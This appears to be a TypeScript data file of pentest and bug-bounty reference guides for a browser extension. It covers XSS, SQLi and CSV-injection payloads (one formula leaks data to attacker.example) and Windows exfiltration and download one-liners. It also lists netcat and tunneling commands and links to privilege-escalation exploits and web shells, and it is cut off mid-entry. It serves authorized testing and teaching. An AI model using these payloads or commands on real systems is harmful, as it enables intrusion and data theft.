import type { PillarId } from '@/types';

export interface GuideSection {
  heading: string;
  body: string;
}

export interface GuideSnippet {
  label: string;
  value: string;
}

export interface GuideSnippetGroup {
  label: string;
  snippets: GuideSnippet[];
}

export interface GuideCrossLink {
  pillar: PillarId;
  moduleId: string;
  label: string;
}

export interface GuideEntry {
  id: string;
  title: string;
  summary: string;
  sections: GuideSection[];
  snippetGroups?: GuideSnippetGroup[];
  crossLinks?: GuideCrossLink[];
  note?: string;
}

// Educational reference material only. Detection, explanation and reporting
// guidance for each vulnerability class. Text payloads (XSS, SQLi, CSV
// formulas) are standard, safe reference strings, but nothing here generates,
// bundles, links or auto-delivers an actual attack file (zip bomb, image
// bomb, or anything else whose purpose is to crash a target).
export const GUIDES: GuideEntry[] = [
  {
    id: 'zip-bomb',
    title: 'Zip Bomb (Decompression DoS)',
    summary: 'A small archive that expands to a massive size on extraction, exhausting disk or memory.',
    sections: [
      {
        heading: 'What it is',
        body: 'A zip bomb is a small archive that expands to an enormous size on extraction, exhausting disk or memory. It is a denial-of-service class against services that auto-extract uploads.',
      },
      {
        heading: 'Where it hits',
        body: 'File-upload features that unzip archives server-side: imports, backups, bulk uploads.',
      },
      {
        heading: 'How to check safely',
        body: 'Confirm the server limits extracted size, entry count, nesting depth, and enforces a timeout. Verify by uploading a normal, valid archive of a reasonable size and observing whether limits are documented or enforced. Do not upload an actual zip bomb: real decompression-DoS testing is usually out of scope for bug bounty programs, and BugEye will not generate or link one.',
      },
      {
        heading: 'Report as',
        body: '"No decompression limit on archive upload, resource-exhaustion risk." Note that actual DoS testing is usually prohibited by bug bounty scope: report the missing control, do not trigger it.',
      },
      {
        heading: 'Fix guidance',
        body: 'Cap extracted size, entry count, and nesting depth. Stream extraction with limits enforced as you go, not just checked afterward. Set a hard timeout on the extraction process.',
      },
    ],
  },
  {
    id: 'image-bomb',
    title: 'Image Decompression / Pixel-Flood (Resource Exhaustion)',
    summary: 'A small image that decodes to enormous pixel dimensions, exhausting memory or CPU during processing.',
    sections: [
      {
        heading: 'What it is',
        body: 'A small image file that decodes to enormous pixel dimensions (sometimes called an image bomb or "lottapixel"), exhausting memory or CPU during image processing. This is a denial-of-service class against avatar, thumbnail and upload endpoints.',
      },
      {
        heading: 'Why it is missed',
        body: 'Apps often cap file size but not decoded dimensions, so a tiny file can still decode to billions of pixels.',
      },
      {
        heading: 'How to check safely',
        body: 'Upload a valid high-dimension image, for example a real 8000x8000 photo, and see if the server rejects it or handles it gracefully. If a legitimate large image hangs or errors the image processor, a decoded-dimension limit is missing. Do not use an actual image bomb file: BugEye will not generate or link one.',
      },
      {
        heading: 'Report as',
        body: '"No decoded-dimension or pixel-count limit on image upload, resource-exhaustion risk," proven with a valid large image, not a crafted bomb.',
      },
      {
        heading: 'Fix guidance',
        body: "Enforce maximum dimensions and total pixel count before full decode. Set image-processing resource policies (for example ImageMagick's policy.xml) and decode timeouts.",
      },
    ],
    crossLinks: [{ pillar: 'utility', moduleId: 'uploadtest', label: 'Open UploadTest for the oversized-but-valid file generator' }],
  },
  {
    id: 'csv-injection',
    title: 'CSV / Formula Injection',
    summary: 'Cells beginning with =, +, - or @ can execute as spreadsheet formulas when exported data is opened.',
    sections: [
      {
        heading: 'What it is',
        body: 'When user input is exported to CSV or XLSX and opened in a spreadsheet, cells beginning with =, +, -, or @ can execute as formulas. This enables data exfiltration and, via DDE, command execution.',
      },
      {
        heading: 'Where it hits',
        body: 'Any feature that exports user-controlled data to CSV or Excel: reports, user lists, data exports.',
      },
      {
        heading: 'How to check',
        body: 'Submit the payloads below as input, export the data, and open the file in a spreadsheet application. Check whether the formula executes or is neutralized (a leading single quote, or escaping of the leading character).',
      },
      {
        heading: 'Report as',
        body: '"CSV formula injection in export, user input executes as a spreadsheet formula."',
      },
      {
        heading: 'Fix guidance',
        body: 'Prefix any cell value starting with =, +, -, or @ with a single quote, or otherwise escape/sanitize the leading character on export.',
      },
    ],
    snippetGroups: [
      {
        label: 'Formula execution',
        snippets: [
          { label: 'Basic formula execution check', value: '=1+1' },
          { label: 'DDE command execution (Windows Excel)', value: "=cmd|'/c calc'!A1" },
          { label: 'DDE via @SUM', value: "@SUM(1+1)*cmd|'/c calc'!A1" },
          { label: 'Data exfiltration via HYPERLINK', value: '=HYPERLINK("http://attacker.example/?leak="&A1,"click")' },
        ],
      },
      {
        label: 'Prefix-only tests',
        snippets: [
          { label: 'Plus-prefixed', value: '+1+1' },
          { label: 'Minus-prefixed', value: '-1+1' },
          { label: 'At-prefixed', value: '@1+1' },
        ],
      },
    ],
  },
  {
    id: 'xss-reference',
    title: 'XSS Payload Reference',
    summary: 'Reflected, stored and DOM XSS, with a short categorized reference of common test payloads.',
    sections: [
      {
        heading: 'The three XSS types',
        body: "Reflected XSS comes back in the immediate response to a request (e.g. a search query echoed into the page). Stored XSS is saved server-side and served to other users later (e.g. a comment field). DOM XSS happens entirely client-side, when JavaScript writes untrusted data into the page without going through the server at all.",
      },
    ],
    snippetGroups: [
      { label: 'Basic', snippets: [{ label: 'Basic script tag', value: '<script>alert(1)</script>' }] },
      {
        label: 'Attribute breakout',
        snippets: [
          { label: 'Close tag and inject', value: '"><script>alert(1)</script>' },
          { label: 'Break out of an attribute', value: '" onmouseover="alert(1)' },
        ],
      },
      {
        label: 'img / svg onerror',
        snippets: [
          { label: 'img onerror', value: '<img src=x onerror=alert(1)>' },
          { label: 'svg onload', value: '<svg onload=alert(1)>' },
        ],
      },
      {
        label: 'Event handlers',
        snippets: [
          { label: 'body onload', value: '<body onload=alert(1)>' },
          { label: 'autofocus onfocus', value: '<input autofocus onfocus=alert(1)>' },
        ],
      },
      { label: 'javascript: URIs', snippets: [{ label: 'javascript: URI', value: 'javascript:alert(1)' }] },
      {
        label: 'Polyglot',
        snippets: [
          {
            label: 'Fires in many injection contexts at once',
            value: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e`,
          },
        ],
      },
      {
        label: 'Common WAF-bypass variants',
        snippets: [
          { label: 'Mixed case', value: '<ScRiPt>alert(1)</ScRiPt>' },
          { label: 'fromCharCode', value: '<svg/onload=alert(String.fromCharCode(88,83,83))>' },
        ],
      },
    ],
    crossLinks: [{ pillar: 'encode-payload', moduleId: 'payloadlib', label: 'See PayloadLib for the full searchable set' }],
    note: 'Generate and copy only. BugEye does not inject or spray payloads.',
  },
  {
    id: 'sqli-reference',
    title: 'SQL Injection Payload Reference',
    summary: 'In-band/union, error-based, boolean-blind and time-blind SQLi, with a short categorized reference.',
    sections: [
      {
        heading: 'The four SQLi types',
        body: 'In-band (union-based) injection returns extracted data directly in the response. Error-based injection leaks data through database error messages. Boolean-blind injection infers data one true/false question at a time. Time-blind injection infers data by measuring response delay instead of any visible difference.',
      },
    ],
    snippetGroups: [
      {
        label: 'Auth bypass',
        snippets: [
          { label: 'Classic OR bypass', value: "' OR '1'='1" },
          { label: 'Comment out the rest of the query', value: "admin'--" },
        ],
      },
      { label: 'Union-based', snippets: [{ label: 'Column-count probe', value: "' UNION SELECT NULL,NULL,NULL--" }] },
      { label: 'Error-based (MySQL)', snippets: [{ label: 'extractvalue error leak', value: "' AND extractvalue(1,concat(0x7e,(SELECT version())))--" }] },
      {
        label: 'Boolean-blind',
        snippets: [
          { label: 'True condition', value: "' AND 1=1--" },
          { label: 'False condition', value: "' AND 1=2--" },
        ],
      },
      {
        label: 'Time-blind (by database)',
        snippets: [
          { label: 'MySQL', value: "' AND SLEEP(5)--" },
          { label: 'MSSQL', value: "'; WAITFOR DELAY '0:0:5'--" },
          { label: 'PostgreSQL', value: "'; SELECT pg_sleep(5)--" },
          { label: 'Oracle', value: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--" },
        ],
      },
    ],
    crossLinks: [{ pillar: 'encode-payload', moduleId: 'payloadlib', label: 'See PayloadLib for the full searchable set' }],
    note: 'Reference strings only. BugEye does not send them automatically.',
  },
  {
    id: 'burp-proxy',
    title: 'Using Burp Suite with BugEye (Proxy Setup Guide)',
    summary: "How to route your browser through Burp for manual testing. BugEye does not request the proxy permission.",
    sections: [
      {
        heading: 'What this is',
        body: "A guide for routing your browser's traffic through Burp Suite for manual testing alongside BugEye. BugEye intentionally does not request the browser proxy permission and does not include an in-extension proxy switch: that permission is sensitive and would let the extension see and alter all your traffic.",
      },
      {
        heading: 'Steps',
        body: '1. Start Burp Suite. 2. Confirm Proxy > Options has a listener on 127.0.0.1:8080 (Burp\'s default). 3. Point your browser, or a dedicated proxy-switcher extension like FoxyProxy, at 127.0.0.1:8080. 4. Install Burp\'s CA certificate in your browser or OS trust store to intercept HTTPS traffic.',
      },
      {
        heading: 'Recommended tool',
        body: 'FoxyProxy or a similar proxy-switcher extension, so you can toggle the proxy on and off quickly without changing OS-wide network settings.',
      },
      {
        heading: 'Tie-in with BugEye',
        body: 'Use ReqLogger to see what the active tab is requesting, and CopyAsCurl to turn a captured or manually entered request into a curl command you can paste into Burp Repeater, or replay directly with curl, once it is routed through Burp.',
      },
    ],
    snippetGroups: [
      {
        label: "Burp's default listener",
        snippets: [
          { label: 'Host', value: '127.0.0.1' },
          { label: 'Port', value: '8080' },
          { label: 'Host:Port', value: '127.0.0.1:8080' },
        ],
      },
    ],
    crossLinks: [
      { pillar: 'traffic', moduleId: 'reqlogger', label: 'Open ReqLogger' },
      { pillar: 'utility', moduleId: 'copyascurl', label: 'Open CopyAsCurl' },
    ],
    note: 'Guide only. BugEye does not add the proxy permission or an in-extension proxy switch.',
  },
  {
    id: 'waf-bypass-methodology',
    title: 'WAF Bypass Testing (manual methodology)',
    summary: 'How to test WAF bypass responsibly: one payload at a time through a proxy, never automated spraying.',
    sections: [
      {
        heading: 'Concept',
        body: 'Send ONE payload at a time through an intercepting proxy (Burp Repeater is ideal, see the Burp guide entry), and observe the response code and body for each one individually before trying the next.',
      },
      {
        heading: 'Workflow',
        body: 'Identify the WAF first with WAFDetect, it tells you what you are up against. Pick a payload from PayloadLib and send it: if it is blocked, try the same payload\'s "advanced bypass" / "encoded" / "modern bypass" variant (already grouped alongside the base payload in PayloadLib: URL-encoding, double-encoding, case variation, comment insertion, Unicode). Send one variant, read the result, then try the next.',
      },
      {
        heading: 'Reading the response',
        body: 'A 403 or a block page means the WAF caught that payload. A 200 with the payload reflected or executed is a potential bypass, verify actual impact before reporting it. A 3xx means check where the redirect actually points, some WAFs redirect to a block page rather than returning 403 directly.',
      },
      {
        heading: 'Why surgical, not automated',
        body: 'Only test within authorized scope. Bulk automated payload spraying against a WAF is usually prohibited by program rules, and hammering an endpoint with hundreds of requests can itself become a denial-of-service. Test one payload, read the result, adjust, repeat. BugEye deliberately does not include a tool that sends payloads automatically. That is active exploitation, outside what a passive recon/triage extension should do, and would get an extension rejected from the Chrome/Edge stores.',
      },
    ],
    crossLinks: [
      { pillar: 'encode-payload', moduleId: 'payloadlib', label: 'Get payloads from PayloadLib' },
      { pillar: 'tab-inspector', moduleId: 'wafdetect', label: 'Identify the WAF with WAFDetect' },
    ],
    note: 'Methodology only. No auto-sending; copy each payload and send it yourself, one at a time.',
  },
  {
    id: 'header-injection-howto',
    title: 'HTTP Header Injection / Bypass (how-to)',
    summary: 'Worked examples for testing header-trusting access controls with HeaderInject, category by category.',
    sections: [
      {
        heading: 'What this is',
        body: 'Many access controls, IP allowlists, and routing decisions trust request headers that a client can set. Testing this means adding or overriding a header and observing whether behavior changes. Authorized scope only.',
      },
      {
        heading: 'How to do it',
        body: '1. In HeaderInject, add a rule: header name plus value. 2. Toggle it on, click "Apply to this tab". 3. Reload the target page. 4. Compare: did access change (200 vs 403), did content change, did a redirect change? Confirm the header was actually sent by testing against httpbin.org/headers first.',
      },
      {
        heading: 'A. IP / access bypass',
        body: 'Spoof a trusted client IP: X-Forwarded-For, X-Real-IP, X-Client-IP, X-Remote-IP, X-Remote-Addr, X-Originating-IP, each set to 127.0.0.1 (or the target\'s own internal IP if known). Some apps grant admin or internal access based on these headers alone.',
      },
      {
        heading: 'B. Host / routing',
        body: 'Host-header attacks, cache poisoning, routing confusion: X-Forwarded-Host, X-Host, X-Original-Host, X-Forwarded-Server, each set to an attacker-controlled domain. Can poison links in emails, password resets, or cache keys.',
      },
      {
        heading: 'C. URL / path override',
        body: 'Reach restricted paths: X-Original-URL, X-Rewrite-URL, set to /admin. Some front-ends block /admin at the edge while the back-end honors these override headers and serves it anyway. When a header alone does not work, pair it with a path-rewrite trick instead, see PayloadLib\'s "403 / Forbidden bypass" category (trailing slash, double slash, case variation, semicolon parameters, encoded slashes) - a 403 is usually a disagreement between two parsers, not one.',
      },
      {
        heading: 'D. Method override',
        body: 'Reach restricted verbs: X-HTTP-Method-Override, X-Method-Override, X-HTTP-Method, set to PUT, DELETE or PATCH, to bypass a method-based restriction that only checks the literal request line.',
      },
      {
        heading: 'E. Scheme / proto',
        body: 'X-Forwarded-Proto and X-Forwarded-Scheme, set to https, can influence redirect or security logic that trusts the proxy-reported scheme instead of the actual connection.',
      },
      {
        heading: 'Reading a result',
        body: 'For each header: the safe outcome is the server ignoring it entirely. A finding is behavior actually changing, meaning the app trusts a client-controlled header for something security-relevant. Test one header at a time; this is manual verification through HeaderInject, not automated attacking.',
      },
    ],
    crossLinks: [
      { pillar: 'traffic', moduleId: 'headerinject', label: 'Open HeaderInject' },
      { pillar: 'encode-payload', moduleId: 'payloadlib', label: 'See the header-based categories in PayloadLib' },
    ],
    note: 'Manual, one header at a time. BugEye sets the header; you observe the response.',
  },
  {
    id: 'payload-usage-howto',
    title: 'Using Payloads (how to test PayloadLib entries manually)',
    summary: 'The workflow for taking a copied reference payload and testing it responsibly, plus what a real hit looks like per class.',
    sections: [
      {
        heading: 'What PayloadLib is',
        body: 'PayloadLib holds reference payloads (SQLi, XSS, LFI, SSRF, SSTI, XXE, command injection, CRLF, NoSQL, LDAP and more). BugEye does not send them. You copy one and test it yourself.',
      },
      {
        heading: 'Workflow',
        body: '1. Identify an input: a URL parameter, form field, header, or JSON body. 2. Copy ONE payload from PayloadLib. 3. Submit it manually, in the browser or via Burp Repeater for more control. 4. Read the response: reflected? executed? an error leaked something? a time delay (blind)? an out-of-band callback (blind)? 5. Confirm actual impact before reporting; a payload that comes back reflected-but-encoded is not the same as one that executed.',
      },
      {
        heading: 'What a hit looks like, by class',
        body: 'XSS: your script executes, an alert fires, or the payload comes back reflected unencoded. SQLi: a database error, a boolean-driven difference in the response, or a time delay (blind). SSTI: {{7*7}} comes back as 49. LFI: file contents (like /etc/passwd) appear in the response. SSRF: your own collector or out-of-band endpoint receives a request. Command injection: command output appears in the response, or an out-of-band callback fires.',
      },
      {
        heading: 'Responsible use',
        body: 'Authorized scope only. One payload at a time, never mass-spraying (that is itself a DoS and is usually out of scope for bug bounty programs). Blind and out-of-band tests need your own collector: interactsh or Burp Collaborator, see BlindXSS and BlindSQLi.',
      },
    ],
    crossLinks: [
      { pillar: 'encode-payload', moduleId: 'payloadlib', label: 'Open PayloadLib' },
      { pillar: 'encode-payload', moduleId: 'blindxss', label: 'Open BlindXSS' },
      { pillar: 'encode-payload', moduleId: 'blindsqli', label: 'Open BlindSQLi' },
    ],
    note: 'Reference and methodology only. BugEye never submits a payload for you.',
  },
  {
    id: 'lpe-exploit-tools',
    title: 'Privilege Escalation & Exploit Collections',
    summary: 'A curated index of third-party local-privilege-escalation exploits and exploit-code repositories.',
    sections: [
      {
        heading: 'What this is',
        body: 'A directory of external repositories for local privilege escalation (Windows and Linux) and general exploit collections, grouped by category so you can find a known exploit for a given CVE or technique quickly.',
      },
    ],
    snippetGroups: [
      {
        label: 'Miscellaneous exploits',
        snippets: [
          { label: 'BadSuccessor LPE', value: 'https://github.com/ibaiC/BadSuccessor' },
          { label: 'BlueHammer LPE (1)', value: 'https://git.projectnightcrawler.dev/NightmareEclipse/BlueHammer' },
          { label: 'BlueHammer LPE (2)', value: 'https://github.com/0xjustBen/BlueHammer' },
          { label: 'Dirty Frag Universal Linux LPE', value: 'https://github.com/V4bel/dirtyfrag' },
          { label: 'MiniPlasma CVE-2020-17103 partially patched cldflt.sys LPE', value: 'https://git.projectnightcrawler.dev/NightmareEclipse/MiniPlasma' },
          { label: 'NoFilter LPE', value: 'https://github.com/deepinstinct/NoFilter' },
          { label: 'OfflineSAM LPE', value: 'https://github.com/gtworek/PSBits/tree/master/OfflineSAM' },
          { label: 'OfflineAddAdmin2 LPE', value: 'https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2' },
          { label: 'PrintSpoofer LPE (1)', value: 'https://github.com/dievus/printspoofer' },
          { label: 'PrintSpoofer LPE (2)', value: 'https://github.com/itm4n/PrintSpoofer' },
          { label: 'SharpSuccessor LPE', value: 'https://github.com/logangoins/SharpSuccessor' },
          { label: 'Shocker Container Escape', value: 'https://github.com/gabrtv/shocker' },
          { label: 'ssh-keysign-pwn', value: 'https://github.com/0xdeadbeefnetwork/ssh-keysign-pwn' },
          { label: 'StorSvc LPE', value: 'https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc' },
          { label: 'SystemNightmare LPE', value: 'https://github.com/GossiTheDog/SystemNightmare' },
        ],
      },
      {
        label: "Windows 'Potato' family LPE (SeImpersonatePrivilege chain)",
        snippets: [
          { label: 'ADCSCoercePotato LPE', value: 'https://github.com/decoder-it/ADCSCoercePotato' },
          { label: 'CoercedPotato LPE', value: 'https://github.com/Prepouce/CoercedPotato' },
          { label: 'DCOMPotato LPE', value: 'https://github.com/zcgonvh/DCOMPotato' },
          { label: 'DeadPotato LPE', value: 'https://github.com/lypd0/DeadPotato' },
          { label: 'GenericPotato LPE', value: 'https://github.com/micahvandeusen/GenericPotato' },
          { label: 'GodPotato LPE', value: 'https://github.com/BeichenDream/GodPotato' },
          { label: 'JuicyPotato LPE', value: 'https://github.com/ohpe/juicy-potato' },
          { label: 'JuicyPotatoNG LPE', value: 'https://github.com/antonioCoco/JuicyPotatoNG' },
          { label: 'MultiPotato LPE', value: 'https://github.com/S3cur3Th1sSh1t/MultiPotato' },
          { label: 'RemotePotato0 LPE', value: 'https://github.com/antonioCoco/RemotePotato0' },
          { label: 'RoguePotato LPE', value: 'https://github.com/antonioCoco/RoguePotato' },
          { label: 'RottenPotatoNG LPE', value: 'https://github.com/breenmachine/RottenPotatoNG' },
          { label: 'RustPotato LPE', value: 'https://github.com/safedv/RustPotato' },
          { label: 'S4UTomato LPE', value: 'https://github.com/wh0amitz/S4UTomato' },
          { label: 'SharpEfsPotato LPE', value: 'https://github.com/bugch3ck/SharpEfsPotato' },
          { label: 'SigmaPotato LPE', value: 'https://github.com/tylerdotrar/SigmaPotato' },
          { label: 'SweetPotato LPE (CCob)', value: 'https://github.com/CCob/SweetPotato' },
          { label: 'SweetPotato LPE (uknowsec)', value: 'https://github.com/uknowsec/SweetPotato' },
        ],
      },
      {
        label: 'Exploit collections',
        snippets: [
          { label: 'bin-sploits', value: 'https://gitlab.com/exploit-database/exploitdb-bin-sploits' },
          { label: 'Kernelhub', value: 'https://github.com/Ascotbe/Kernelhub' },
          { label: 'Next.js v16.2.4 Exploit Collection', value: 'https://github.com/dwisiswant0/next-16.2.4-pocs' },
          { label: 'Pre-compiled Windows Exploits', value: 'https://github.com/abatchy17/WindowsExploits' },
          { label: 'Windows Exploits', value: 'https://github.com/SecWiki/windows-kernel-exploits' },
        ],
      },
    ],
    note: 'External third-party tools/exploits, not maintained or reviewed by BugEye. Use only against systems you are authorized to test, and review the source before running anything.',
  },
  {
    id: 'payload-wordlist-tools',
    title: 'Payload & Wordlist Generators',
    summary: 'External repositories for payload collections and username/password wordlist generation tools.',
    sections: [
      {
        heading: 'What this is',
        body: 'A directory of external payload collections (web shells, generic attack payloads) and wordlist/username-generation tools, for use alongside BugEye\'s own PayloadLib and ShellGen.',
      },
    ],
    snippetGroups: [
      {
        label: 'Payloads',
        snippets: [
          { label: 'Payload Box', value: 'https://github.com/payloadbox' },
          { label: 'PayloadsAllTheThings', value: 'https://github.com/swisskyrepo/PayloadsAllTheThings' },
          { label: 'phpggc', value: 'https://github.com/ambionics/phpggc' },
          { label: 'PHP-Reverse-Shell', value: 'https://github.com/ivan-sincek/php-reverse-shell' },
          { label: 'webshell', value: 'https://github.com/tennc/webshell' },
          { label: 'Web-Shells', value: 'https://github.com/TheBinitGhimire/Web-Shells' },
        ],
      },
      {
        label: 'Wordlists',
        snippets: [
          { label: 'bopscrk', value: 'https://github.com/R3nt0n/bopscrk' },
          { label: 'CeWL', value: 'https://github.com/digininja/cewl' },
          { label: 'COOK', value: 'https://github.com/giteshnxtlvl/cook' },
          { label: 'CUPP', value: 'https://github.com/Mebus/cupp' },
          { label: 'Kerberos Username Enumeration', value: 'https://github.com/attackdebris/kerberos_enum_userlists' },
          { label: 'SecLists', value: 'https://github.com/danielmiessler/SecLists' },
          { label: 'Username Anarchy', value: 'https://github.com/urbanadventurer/username-anarchy' },
        ],
      },
    ],
    crossLinks: [
      { pillar: 'encode-payload', moduleId: 'shellgen', label: 'Open ShellGen for reverse-shell one-liners BugEye can generate itself' },
      { pillar: 'encode-payload', moduleId: 'payloadlib', label: "Open PayloadLib for BugEye's own payload reference" },
    ],
  },
  {
    id: 'file-transfer-cheatsheet',
    title: 'File Transfer Cheat Sheet',
    summary: 'Copy-paste commands for moving files to and from a target over HTTP, SMB, netcat, SSH and more.',
    sections: [
      {
        heading: 'What this is',
        body: 'Reference commands for setting up quick file-transfer servers and listeners during authorized testing: HTTP, WebDAV, SMB, netcat, Windows download/exfil one-liners, and SSH/SCP.',
      },
      {
        heading: 'Tip',
        body: 'Beware of reflected ports when setting up listeners.',
      },
    ],
    snippetGroups: [
      {
        label: 'HTTP server',
        snippets: [
          { label: 'Simple Python server', value: 'python -m http.server <port>' },
          { label: 'WebDAV server', value: 'wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r .' },
          { label: 'Apache (copy files to /var/www/html)', value: 'sudo systemctl start apache2' },
        ],
      },
      {
        label: 'SMB server',
        snippets: [
          { label: 'impacket-smbserver', value: 'impacket-smbserver -smb2support share $(pwd)' },
          { label: 'impacket-smbserver, Windows 10+ with authentication', value: 'impacket-smbserver -smb2support -user test -password test share $(pwd)' },
        ],
      },
      {
        label: 'Netcat',
        snippets: [
          { label: 'Start a listener', value: 'nc -lvnp <port> > received_file' },
          { label: 'Send the file', value: 'nc <ip> <port> < <file_path>' },
        ],
      },
      {
        label: 'Downloading files (Windows)',
        snippets: [
          { label: 'PowerShell', value: 'iwr -uri <uri> -outfile <filename>' },
          { label: 'CMD', value: 'certutil -urlcache -split -f <uri> <dest>' },
          { label: 'Copy from SMB share', value: 'copy \\\\<ip>\\share\\<file>' },
          { label: 'Mount share before copy, Win 10+ without authentication', value: 'net use Z: \\\\<ip>\\share' },
          { label: 'Mount share before copy, Win 10+ with authentication', value: "net use Z: \\\\<ip>\\share /u:user 'pass'" },
        ],
      },
      {
        label: 'Exfiltrating files from Windows',
        snippets: [
          { label: 'Send file to a Python upload-enabled server (PowerShell)', value: 'Invoke-WebRequest -Uri http://<linux-ip>:<port>/upload -Method Post -InFile C:\\path\\to\\file' },
          { label: 'Send file with curl', value: 'curl -F "file=@C:\\path\\to\\file.txt" http://<linux-ip>:<port> -u user:pass' },
          { label: 'Copy to SMB share', value: 'copy C:\\path\\to\\file \\\\<ip>\\share' },
        ],
      },
      {
        label: 'SSH',
        snippets: [
          { label: 'Create keys', value: 'ssh-keygen -t rsa -b 4096' },
          { label: 'Transfer data to', value: 'scp <file> <user>@<ip>:<path>' },
          { label: 'Transfer data from', value: 'scp <user>@<ip>:<path> <file>' },
          { label: 'Use legacy SCP protocol instead of SFTP', value: 'scp -O <file> <user>@<ip>:<path>' },
        ],
      },
      {
        label: 'Misc',
        snippets: [
          { label: 'Reduce binary size (useful before transferring)', value: 'upx <bin_path>' },
          { label: 'Extract files from a binary', value: 'binwalk -e <bin_path>' },
        ],
      },
    ],
  },
  {
    id: 'os-commands-cheatsheet',
    title: 'OS Commands Cheat Sheet',
    summary: 'Common Linux command-line reference for post-access enumeration: users, files, processes, networking and services.',
    sections: [
      {
        heading: 'What this is',
        body: 'A quick-reference set of standard Linux/Unix commands for system information, user management, file operations, process management, networking, and service control, useful during authorized post-access enumeration.',
      },
    ],
    snippetGroups: [
      {
        label: 'System information',
        snippets: [
          { label: 'Kernel info', value: 'uname -a' },
          { label: 'Distro info', value: 'lsb_release -a' },
        ],
      },
      {
        label: 'User management',
        snippets: [
          { label: 'Show user info', value: 'id <username>' },
          { label: 'Current user', value: 'whoami' },
          { label: "User's groups", value: 'groups <username>' },
          { label: 'Switch to user', value: 'su - <username>' },
          { label: 'Switch to root', value: 'sudo su -' },
          { label: 'Check sudo permissions', value: 'sudo -l' },
          { label: 'Show who is logged in', value: 'who' },
          { label: 'Show last logins', value: 'last' },
        ],
      },
      {
        label: 'File operations',
        snippets: [
          { label: 'Find file by name', value: 'find / -name filename 2>/dev/null' },
          { label: 'Find text in files', value: 'grep -r "text" /path 2>/dev/null' },
          { label: 'Compress files', value: 'tar -czvf archive.tar.gz /path' },
          { label: 'Extract archive', value: 'tar -xzvf archive.tar.gz' },
          { label: 'Find a program', value: 'which <program>' },
        ],
      },
      {
        label: 'Process management',
        snippets: [
          { label: 'List all processes', value: 'ps aux' },
          { label: 'Kill a process', value: 'kill <pid>' },
          { label: 'Force-kill a process', value: 'kill -9 <pid>' },
          { label: 'Find process PID by name', value: 'pgrep process_name' },
        ],
      },
      {
        label: 'Networking',
        snippets: [
          { label: 'Show interfaces', value: 'ip a' },
          { label: 'List listening connections', value: 'ss -ntplu' },
          { label: 'Show processes listening on a port', value: 'lsof :i<port>' },
          { label: 'DNS lookup', value: 'dig domain' },
          { label: 'Kill a connection on a port', value: 'fuser -k <port>/tcp' },
          { label: 'Routing table', value: 'ip route show' },
          { label: 'Log incoming traffic on a port', value: 'sudo tcpdump -nvvvXi tun0 tcp port 8080' },
        ],
      },
      {
        label: 'Service management',
        snippets: [
          { label: 'Check service status (systemd)', value: 'systemctl status service_name' },
          { label: 'Start/stop/restart a service (systemd)', value: 'systemctl start|stop|restart service_name' },
          { label: 'Enable/disable at boot', value: 'systemctl enable|disable service_name' },
          { label: 'Check service status (no systemd)', value: 'service service_name status' },
        ],
      },
      {
        label: 'System control',
        snippets: [
          { label: 'Reboot', value: 'sudo reboot' },
          { label: 'Shutdown', value: 'sudo shutdown -h now' },
        ],
      },
      {
        label: 'Git',
        snippets: [
          { label: 'Dump an exposed .git repo (git-dumper)', value: 'git-dumper <url>/.git ./website' },
          { label: 'Show commit log', value: 'git log' },
          { label: "Show a commit's changes", value: 'git show <commit>' },
        ],
      },
    ],
  },
  {
    id: 'aws-s3-cheatsheet',
    title: 'AWS S3 Cheat Sheet',
    summary: 'AWS CLI commands for listing, downloading and probing S3 buckets discovered during recon.',
    sections: [
      {
        heading: 'What this is',
        body: 'Reference AWS CLI commands for interacting with S3 buckets: listing contents without credentials, downloading a bucket, checking its policy, and uploading a file when a misconfiguration allows it.',
      },
    ],
    snippetGroups: [
      {
        label: 'S3',
        snippets: [
          { label: 'List a public bucket without credentials', value: 'aws s3 ls s3://<bucket>/ --endpoint-url <url> --no-sign-request' },
          { label: 'Download a bucket', value: 'aws s3 cp s3://<bucket> ./' },
          { label: 'Check bucket policy', value: 'aws s3api get-bucket-policy --bucket <bucket> --endpoint-url <url> --no-sign-request' },
          { label: 'Upload a file to a bucket', value: 'aws s3 cp <file> s3://<bucket>/ --endpoint-url <url> --no-sign-request' },
        ],
      },
    ],
    crossLinks: [{ pillar: 'osint', moduleId: 'bucketspot', label: 'Open BucketSpot to find exposed buckets first' }],
    note: "Out of scope for most engagements unless the target's own AWS access keys are found during testing, set up credentials first with aws configure only if you have explicit authorization.",
  },
  {
    id: 'port-forwarding-tunneling',
    title: 'Port Forwarding & Tunneling',
    summary: 'Commands for socat, SSH, Chisel, Ligolo-ng, dnscat2 and sshuttle to pivot traffic between networks.',
    sections: [
      {
        heading: 'What this is',
        body: 'Reference commands for the common port-forwarding and tunneling tools used to pivot traffic during authorized testing: socat, SSH forwarding, Chisel, Ligolo-ng, DNS tunneling with dnscat2, sshuttle, and Windows-side tunneling tools.',
      },
    ],
    snippetGroups: [
      {
        label: 'Socat',
        snippets: [{ label: 'Port redirection', value: 'socat TCP-LISTEN:<local_port>,fork TCP:<ip>:<port>' }],
      },
      {
        label: 'SSH port forwarding',
        snippets: [
          { label: 'Local port forwarding', value: 'ssh -L 8080:localhost:80 user@ssh_server' },
          { label: 'Remote port forwarding', value: 'ssh -R 127.0.0.1:9090:<target>:80 user@kali_machine' },
          { label: 'Dynamic port forwarding (SOCKS proxy)', value: 'ssh -D 9050 user@10.4.213.215' },
        ],
      },
      {
        label: 'Chisel',
        snippets: [
          { label: 'Create server', value: 'chisel server --port 8080 --reverse' },
          { label: 'Create client on remote machine', value: 'chisel client <local_host>:8080 R:<local_port>:localhost:<remote_port>' },
          { label: 'Create SOCKS5 server', value: 'chisel server --port 8080 --reverse --socks5' },
          { label: 'Create SOCKS5 client', value: 'chisel client <local_host>:8080 R:socks' },
        ],
      },
      {
        label: 'Ligolo-ng',
        snippets: [
          { label: 'Releases', value: 'https://github.com/nicocha30/ligolo-ng/releases' },
          { label: 'Start proxy on attacker machine', value: './li-proxy -selfcert -laddr 0.0.0.0:443' },
          { label: 'Start agent on target machine', value: './li-agent -connect <attacker_ip>:443 -ignore-cert' },
        ],
      },
      {
        label: 'DNS tunneling (dnscat2)',
        snippets: [
          { label: 'Start server', value: 'dnscat2-server feline.corp' },
